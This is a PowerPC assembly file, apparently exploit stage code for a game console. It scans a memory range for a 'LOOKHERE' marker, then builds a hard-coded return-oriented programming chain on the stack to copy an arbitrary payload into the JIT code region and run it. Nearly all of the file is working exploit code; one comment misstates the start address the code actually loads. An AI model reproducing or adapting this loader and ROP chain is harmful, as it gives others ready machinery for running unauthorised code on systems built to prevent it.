# This is a program written in PPC to search address range 1C000000-1D000000
# for the magic "LOOKHERE", then load the code based on the format

#Format to load:
# struct PAYLOAD{
#     char magic[8];   // "LOOKHERE"
#     uint32 size;     // Size of code
#     byte code[size]; // Raw PPC to load
# }

#Set up register aliases to make the code more readable
.set r0, 0
.set r1, 1
.set r2, 2
.set r3, 3
.set r4, 4
.set r5, 5
.set r6, 6
.set r7, 7
.set r8, 8
.set r9, 9
.set r10, 10
.set r11, 11
.set r12, 12
.set r13, 13
.set r14, 14
.set r15, 15
.set r16, 16
.set r17, 17
.set r18, 18
.set r19, 19
.set r20, 20
.set r21, 21
.set r22, 22
.set r23, 23
.set r24, 24
.set r25, 25
.set r26, 26
.set r27, 27
.set r28, 28
.set r29, 29
.set r30, 30
.set r31, 31

#load address range to search
lis r7, 0x1B00 #r7 = 1C000000
lis r8, 0x1D00 #r8 = 1D000000

#Load "LOOK" in r9
lis r9, 0x4C4F
ori r9, r9, 0x4F4B

#Load "HERE" in r10
lis r10, 0x4845
ori r10, r10, 0x5245

loop_start:
    #Check if the first word at r7 is equal to "LOOK" (r9)
    lwz r11, 0(r7)
    cmpw r11, r9
    bne not_equal #If not, restart loop

    #Check if second word at r7 is equal to "HERE" (r10)
    lwz r11, 4(r7)
    cmpw r11, r10
    beq found #If so, exit the loop and load the code

    #If "LOOKHERE" is not located at r7
    not_equal:
        #Increment by one word
        addi r7, r7, 4
        cmpw r7, r8 #Check if the counter (r7) is out of search range
        bge not_found #If out of range, exit loop and kill program
        b loop_start #If still in range, restart loop


found:
    #Setup r11 as payloadSize and r7 as payloadAddress
    lwz r11, 8(r7)
    addi r7, r7, 0xC

    #Set up ROP chain to copy our code to codegen (we can't be executing from JIT while copying to JIT)
    #See ropChainToAsm.py for in-order ROP chain
    li r10, 0x0000
    stw r10, 0x0(r1)
    stw r10, 0x8(r1)
    stw r10, 0xC(r1)
    stw r10, 0x10(r1)
    stw r10, 0x14(r1)
    stw r10, 0x18(r1)
    stw r10, 0x24(r1)
    stw r10, 0x28(r1)
    stw r10, 0x2C(r1)
    stw r10, 0x30(r1)
    stw r10, 0x38(r1)
    stw r10, 0x3C(r1)
    stw r10, 0x40(r1)
    stw r10, 0x44(r1)
    stw r10, 0x48(r1)
    stw r10, 0x50(r1)
    stw r10, 0x54(r1)
    stw r10, 0x58(r1)
    stw r10, 0x60(r1)
    stw r10, 0x70(r1)
    stw r10, 0x78(r1)
    stw r10, 0x80(r1)
    stw r10, 0x84(r1)
    stw r10, 0x88(r1)
    stw r10, 0x8C(r1)
    stw r10, 0x90(r1)
    stw r10, 0x98(r1)
    stw r10, 0x9C(r1)
    stw r10, 0xA0(r1)
    stw r10, 0xA4(r1)
    stw r10, 0xA8(r1)
    stw r10, 0xB8(r1)
    stw r10, 0xBC(r1)
    stw r10, 0xC0(r1)
    stw r10, 0xC8(r1)
    stw r10, 0xCC(r1)
    stw r10, 0xD0(r1)
    stw r10, 0xD4(r1)
    stw r10, 0xD8(r1)
    stw r10, 0xE0(r1)
    stw r10, 0xE4(r1)
    stw r10, 0xE8(r1)
    stw r10, 0xEC(r1)
    stw r10, 0xF0(r1)
    stw r10, 0x100(r1)
    stw r10, 0x108(r1)
    stw r10, 0x110(r1)
    stw r10, 0x114(r1)
    stw r10, 0x118(r1)
    stw r10, 0x11C(r1)
    stw r10, 0x120(r1)
    stw r10, 0x128(r1)
    stw r10, 0x12C(r1)
    stw r10, 0x130(r1)
    stw r10, 0x134(r1)
    stw r10, 0x138(r1)
    stw r10, 0x148(r1)
    stw r10, 0x150(r1)
    stw r10, 0x158(r1)
    li r10, 0x0001
    stw r10, 0xB4(r1)
    lis r10, 0x0102
    ori r10, r10, 0x04C8
    stw r10, 0x4(r1)
    stw r10, 0x4C(r1)
    stw r10, 0x94(r1)
    stw r10, 0xDC(r1)
    stw r10, 0x124(r1)
    lis r10, 0x0102
    ori r10, r10, 0x3F88
    stw r10, 0xF8(r1)
    lis r10, 0x0102
    ori r10, r10, 0x40B0
    stw r10, 0x140(r1)
    lis r10, 0x0103
    ori r10, r10, 0x5FC8
    stw r10, 0x68(r1)
    lis r10, 0x0103
    ori r10, r10, 0x76C0
    stw r10, 0x20(r1)
    stw r10, 0xB0(r1)
    lis r10, 0x0107
    ori r10, r10, 0xDD70
    stw r10, 0x1C(r1)
    stw r10, 0x64(r1)
    stw r10, 0xAC(r1)
    stw r10, 0xF4(r1)
    stw r10, 0x13C(r1)
    lis r10, 0x0108
    ori r10, r10, 0x0274
    stw r10, 0x34(r1)
    stw r10, 0x7C(r1)
    stw r10, 0xC4(r1)
    stw r10, 0x10C(r1)
    stw r10, 0x154(r1)
    lis r10, 0x0180
    stw r10, 0x6C(r1)
    stw r10, 0xFC(r1)
    stw r10, 0x144(r1)
    stw r10, 0x15C(r1)
    stw r7, 0x74(r1)
    stw r11, 0x5C(r1)
    stw r11, 0x104(r1)
    stw r11, 0x14C(r1)

    #Start ROP
    lwz r0, 0x4(r1)
    mtlr r0
    blr

not_found:
    blr #RIP, no payload found
